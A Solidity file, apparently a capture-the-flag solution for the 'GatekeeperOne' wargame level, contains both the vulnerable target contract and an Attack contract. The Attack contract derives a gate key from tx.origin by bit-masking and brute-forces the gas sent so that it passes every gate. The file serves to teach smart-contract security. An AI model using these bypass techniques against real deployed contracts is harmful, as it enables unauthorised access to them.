// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {
    // gateOne will pass as we calling the function from different address

    // gateThree
    // Requirement 1
    // uint64 = B1 B2 B3 B4 B5 B6 B7 B8
    // uint32 = B5 B6 B7 B8
    // uint16 = B7 B8
    // So Requirement 1 = B5 B6 == 0000 0000

    // Requirement 2
    //  B7 B8 != zero

    // requirement 3
    // B7 B8 == LAST TWO Bytes of address of Tx.origin

    function attack(address _target) public {
        bytes8 gatekey = bytes8(
            uint64(uint160(tx.origin)) & 0xFFFFFFFF0000FFFF
        );

        for (uint i = 0; i <= 300; i++) {
            uint totalGas = i + (8191 * 3);
            (bool send, ) = _target.call{gas: totalGas}(
                abi.encodeWithSignature("enter(bytes8)", gatekey)
            );
            if (send) {
                break;
            }
        }
    }
}

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(
            uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)),
            "GatekeeperOne: invalid gateThree part one"
        );
        require(
            uint32(uint64(_gateKey)) != uint64(_gateKey),
            "GatekeeperOne: invalid gateThree part two"
        );
        require(
            uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)),
            "GatekeeperOne: invalid gateThree part three"
        );
        _;
    }

    function enter(
        bytes8 _gateKey
    ) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
